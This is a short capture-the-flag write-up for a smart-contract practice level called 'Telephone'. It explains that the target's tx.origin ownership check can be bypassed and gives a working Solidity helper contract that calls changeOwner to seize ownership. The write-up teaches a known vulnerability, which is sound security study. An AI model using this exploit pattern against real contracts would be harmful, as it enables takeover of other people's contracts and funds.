Level 4: Telephone

Objective:

Claim ownership of the contract instance.

Concept:

Using of an Helper contract

Explanation:

So this contract is preventing us from becoming the owner by checking tx.origin but we can bypass that using a helper contract.

Solution:

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
function changeOwner(address \_owner) external;
}

contract TelephoneHack {
function attack(address target) public {
Telephone(target).changeOwner(msg.sender);
}
}

after deploying call the attack function after which you will be the new owner.

Key Takeaways:

tx.origin is dangerous for access control.
